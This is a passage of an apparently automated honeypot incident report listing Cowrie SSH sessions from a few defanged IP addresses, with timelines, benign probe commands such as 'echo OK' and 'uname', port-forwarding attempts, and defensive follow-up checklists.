| `2026-07-06 08:52:42` | `cowrie.session.connect` |
| `2026-07-06 08:52:43` | `cowrie.client.version` |
| `2026-07-06 08:52:43` | `cowrie.client.kex` |
| `2026-07-06 08:52:50` | `cowrie.login.success` |
| `2026-07-06 08:52:54` | `cowrie.session.params` |
| `2026-07-06 08:52:54` | `cowrie.command.input` |
| `2026-07-06 08:52:56` | `cowrie.log.closed` |
| `2026-07-06 08:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b178d6071e8a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 08:57 |
| **Last Seen** | 2026-07-06 08:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:57:12` | `cowrie.session.connect` |
| `2026-07-06 08:57:12` | `cowrie.client.version` |
| `2026-07-06 08:57:12` | `cowrie.client.kex` |
| `2026-07-06 08:57:12` | `cowrie.login.success` |
| `2026-07-06 08:57:12` | `cowrie.direct-tcpip.request` |
| `2026-07-06 08:57:12` | `cowrie.direct-tcpip.data` |
| `2026-07-06 08:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45eca62facda

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 09:05 |
| **Last Seen** | 2026-07-06 09:05 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:05:05` | `cowrie.session.connect` |
| `2026-07-06 09:05:07` | `cowrie.client.version` |
| `2026-07-06 09:05:07` | `cowrie.client.kex` |
| `2026-07-06 09:05:13` | `cowrie.login.success` |
| `2026-07-06 09:05:16` | `cowrie.session.params` |
| `2026-07-06 09:05:16` | `cowrie.command.input` |
| `2026-07-06 09:05:18` | `cowrie.log.closed` |
| `2026-07-06 09:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b30dcf67cdc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 09:07 |
| **Last Seen** | 2026-07-06 09:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:07:38` | `cowrie.session.connect` |
| `2026-07-06 09:07:38` | `cowrie.client.version` |
| `2026-07-06 09:07:38` | `cowrie.client.kex` |
| `2026-07-06 09:07:38` | `cowrie.login.success` |
| `2026-07-06 09:07:38` | `cowrie.direct-tcpip.request` |
| `2026-07-06 09:07:38` | `cowrie.direct-tcpip.data` |
| `2026-07-06 09:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37853ac1ed7f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 09:17 |
| **Last Seen** | 2026-07-06 09:17 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:17:33` | `cowrie.session.connect` |
| `2026-07-06 09:17:35` | `cowrie.client.version` |
| `2026-07-06 09:17:35` | `cowrie.client.kex` |
| `2026-07-06 09:17:42` | `cowrie.login.success` |
| `2026-07-06 09:17:46` | `cowrie.session.params` |
| `2026-07-06 09:17:46` | `cowrie.command.input` |
| `2026-07-06 09:17:47` | `cowrie.log.closed` |
| `2026-07-06 09:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f0079e4ad7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 09:22 |
| **Last Seen** | 2026-07-06 09:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:22:17` | `cowrie.session.connect` |
| `2026-07-06 09:22:17` | `cowrie.client.version` |
| `2026-07-06 09:22:17` | `cowrie.client.kex` |
| `2026-07-06 09:22:17` | `cowrie.login.success` |
| `2026-07-06 09:22:18` | `cowrie.session.params` |
| `2026-07-06 09:22:18` | `cowrie.command.input` |
| `2026-07-06 09:22:18` | `cowrie.log.closed` |
| `2026-07-06 09:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54d3ad6193df

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 09:23 |
| **Last Seen** | 2026-07-06 09:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:23:38` | `cowrie.session.connect` |
| `2026-07-06 09:23:38` | `cowrie.client.version` |
| `2026-07-06 09:23:38` | `cowrie.client.kex` |
| `2026-07-06 09:23:38` | `cowrie.login.success` |
| `2026-07-06 09:23:38` | `cowrie.direct-tcpip.request` |
| `2026-07-06 09:23:38` | `cowrie.direct-tcpip.data` |
| `2026-07-06 09:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17be369a9bda

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:04` | `cowrie.session.connect` |
| `2026-07-06 09:25:04` | `cowrie.client.version` |
| `2026-07-06 09:25:05` | `cowrie.client.kex` |
| `2026-07-06 09:25:06` | `cowrie.login.success` |
| `2026-07-06 09:25:07` | `cowrie.session.params` |
| `2026-07-06 09:25:07` | `cowrie.command.input` |
| `2026-07-06 09:25:07` | `cowrie.log.closed` |
| `2026-07-06 09:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496ef4363564

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:05` | `cowrie.session.connect` |
| `2026-07-06 09:25:05` | `cowrie.client.version` |
| `2026-07-06 09:25:06` | `cowrie.client.kex` |
| `2026-07-06 09:25:07` | `cowrie.login.success` |
| `2026-07-06 09:25:08` | `cowrie.session.params` |
| `2026-07-06 09:25:08` | `cowrie.command.input` |
| `2026-07-06 09:25:08` | `cowrie.log.closed` |
| `2026-07-06 09:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4677b47a87d6

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:07` | `cowrie.session.connect` |
| `2026-07-06 09:25:07` | `cowrie.client.version` |
| `2026-07-06 09:25:07` | `cowrie.client.kex` |
| `2026-07-06 09:25:08` | `cowrie.login.success` |
| `2026-07-06 09:25:09` | `cowrie.session.params` |
| `2026-07-06 09:25:09` | `cowrie.command.input` |
| `2026-07-06 09:25:10` | `cowrie.log.closed` |
| `2026-07-06 09:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2472a722dfc

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:08` | `cowrie.session.connect` |
| `2026-07-06 09:25:08` | `cowrie.client.version` |
| `2026-07-06 09:25:08` | `cowrie.client.kex` |
| `2026-07-06 09:25:10` | `cowrie.login.success` |
| `2026-07-06 09:25:12` | `cowrie.session.params` |
| `2026-07-06 09:25:12` | `cowrie.command.input` |
| `2026-07-06 09:25:12` | `cowrie.log.closed` |
| `2026-07-06 09:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d568ccc3171

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:09` | `cowrie.session.connect` |
| `2026-07-06 09:25:10` | `cowrie.client.version` |
| `2026-07-06 09:25:10` | `cowrie.client.kex` |
| `2026-07-06 09:25:12` | `cowrie.login.success` |
| `2026-07-06 09:25:13` | `cowrie.session.params` |
| `2026-07-06 09:25:13` | `cowrie.command.input` |
| `2026-07-06 09:25:13` | `cowrie.log.closed` |
| `2026-07-06 09:25:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e430360edfe8

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:12` | `cowrie.session.connect` |
| `2026-07-06 09:25:12` | `cowrie.client.version` |
| `2026-07-06 09:25:12` | `cowrie.client.kex` |
| `2026-07-06 09:25:13` | `cowrie.login.success` |
| `2026-07-06 09:25:14` | `cowrie.session.params` |
| `2026-07-06 09:25:14` | `cowrie.command.input` |
| `2026-07-06 09:25:14` | `cowrie.log.closed` |
| `2026-07-06 09:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c9a21e1663

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:13` | `cowrie.session.connect` |
| `2026-07-06 09:25:13` | `cowrie.client.version` |
| `2026-07-06 09:25:14` | `cowrie.client.kex` |
| `2026-07-06 09:25:15` | `cowrie.login.success` |
| `2026-07-06 09:25:16` | `cowrie.session.params` |
| `2026-07-06 09:25:16` | `cowrie.command.input` |
| `2026-07-06 09:25:16` | `cowrie.log.closed` |
| `2026-07-06 09:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ca0bd02151

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:15` | `cowrie.session.connect` |
| `2026-07-06 09:25:15` | `cowrie.client.version` |
| `2026-07-06 09:25:15` | `cowrie.client.kex` |
| `2026-07-06 09:25:16` | `cowrie.login.success` |
| `2026-07-06 09:25:17` | `cowrie.session.params` |
| `2026-07-06 09:25:17` | `cowrie.command.input` |
| `2026-07-06 09:25:18` | `cowrie.log.closed` |
| `2026-07-06 09:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f48845f3766

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:17` | `cowrie.session.connect` |
| `2026-07-06 09:25:17` | `cowrie.client.version` |
| `2026-07-06 09:25:19` | `cowrie.client.kex` |
| `2026-07-06 09:25:22` | `cowrie.login.success` |
| `2026-07-06 09:25:23` | `cowrie.session.params` |
| `2026-07-06 09:25:23` | `cowrie.command.input` |
| `2026-07-06 09:25:25` | `cowrie.log.closed` |
| `2026-07-06 09:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fd863442a0

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:18` | `cowrie.session.connect` |
| `2026-07-06 09:25:18` | `cowrie.client.version` |
| `2026-07-06 09:25:18` | `cowrie.client.kex` |
| `2026-07-06 09:25:19` | `cowrie.login.success` |
| `2026-07-06 09:25:20` | `cowrie.session.params` |
| `2026-07-06 09:25:20` | `cowrie.command.input` |
| `2026-07-06 09:25:20` | `cowrie.log.closed` |
| `2026-07-06 09:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba19e21c3b47

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:19` | `cowrie.session.connect` |
| `2026-07-06 09:25:20` | `cowrie.client.version` |
| `2026-07-06 09:25:20` | `cowrie.client.kex` |
| `2026-07-06 09:25:22` | `cowrie.login.success` |
| `2026-07-06 09:25:24` | `cowrie.session.params` |
| `2026-07-06 09:25:24` | `cowrie.command.input` |
| `2026-07-06 09:25:26` | `cowrie.log.closed` |
| `2026-07-06 09:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80f8851cb19a

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:20` | `cowrie.session.connect` |
| `2026-07-06 09:25:20` | `cowrie.client.version` |
| `2026-07-06 09:25:20` | `cowrie.client.kex` |
| `2026-07-06 09:25:22` | `cowrie.login.success` |
| `2026-07-06 09:25:25` | `cowrie.session.params` |
| `2026-07-06 09:25:25` | `cowrie.command.input` |
| `2026-07-06 09:25:26` | `cowrie.log.closed` |
| `2026-07-06 09:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea475238ec2f

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:20` | `cowrie.session.connect` |
| `2026-07-06 09:25:20` | `cowrie.client.version` |
| `2026-07-06 09:25:21` | `cowrie.client.kex` |
| `2026-07-06 09:25:22` | `cowrie.login.success` |
| `2026-07-06 09:25:26` | `cowrie.session.params` |
| `2026-07-06 09:25:26` | `cowrie.command.input` |
| `2026-07-06 09:25:27` | `cowrie.log.closed` |
| `2026-07-06 09:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c4e5a84ca2

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:20` | `cowrie.session.connect` |
| `2026-07-06 09:25:20` | `cowrie.client.version` |
| `2026-07-06 09:25:21` | `cowrie.client.kex` |
| `2026-07-06 09:25:23` | `cowrie.login.success` |
| `2026-07-06 09:25:26` | `cowrie.session.params` |
| `2026-07-06 09:25:26` | `cowrie.command.input` |
| `2026-07-06 09:25:27` | `cowrie.log.closed` |
| `2026-07-06 09:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4809dff6e205

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:21` | `cowrie.session.connect` |
| `2026-07-06 09:25:21` | `cowrie.client.version` |
| `2026-07-06 09:25:21` | `cowrie.client.kex` |
| `2026-07-06 09:25:26` | `cowrie.login.success` |
| `2026-07-06 09:25:29` | `cowrie.session.params` |
| `2026-07-06 09:25:29` | `cowrie.command.input` |
| `2026-07-06 09:25:30` | `cowrie.log.closed` |
| `2026-07-06 09:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfe61fd81165

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:24` | `cowrie.session.connect` |
| `2026-07-06 09:25:25` | `cowrie.client.version` |
| `2026-07-06 09:25:26` | `cowrie.client.kex` |
| `2026-07-06 09:25:27` | `cowrie.login.success` |
| `2026-07-06 09:25:28` | `cowrie.session.params` |
| `2026-07-06 09:25:28` | `cowrie.command.input` |
| `2026-07-06 09:25:29` | `cowrie.log.closed` |
| `2026-07-06 09:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61683354b185

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:25` | `cowrie.session.connect` |
| `2026-07-06 09:25:25` | `cowrie.client.version` |
| `2026-07-06 09:25:26` | `cowrie.client.kex` |
| `2026-07-06 09:25:30` | `cowrie.login.success` |
| `2026-07-06 09:25:35` | `cowrie.session.params` |
| `2026-07-06 09:25:35` | `cowrie.command.input` |
| `2026-07-06 09:25:36` | `cowrie.log.closed` |
| `2026-07-06 09:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b019603029f6

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:26` | `cowrie.session.connect` |
| `2026-07-06 09:25:26` | `cowrie.client.version` |
| `2026-07-06 09:25:27` | `cowrie.client.kex` |
| `2026-07-06 09:25:27` | `cowrie.login.success` |
| `2026-07-06 09:25:30` | `cowrie.session.params` |
| `2026-07-06 09:25:30` | `cowrie.command.input` |
| `2026-07-06 09:25:30` | `cowrie.log.closed` |
| `2026-07-06 09:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09951db6d10c

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:28` | `cowrie.session.connect` |
| `2026-07-06 09:25:28` | `cowrie.client.version` |
| `2026-07-06 09:25:30` | `cowrie.client.kex` |
| `2026-07-06 09:25:30` | `cowrie.login.success` |
| `2026-07-06 09:25:32` | `cowrie.session.params` |
| `2026-07-06 09:25:32` | `cowrie.command.input` |
| `2026-07-06 09:25:32` | `cowrie.log.closed` |
| `2026-07-06 09:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
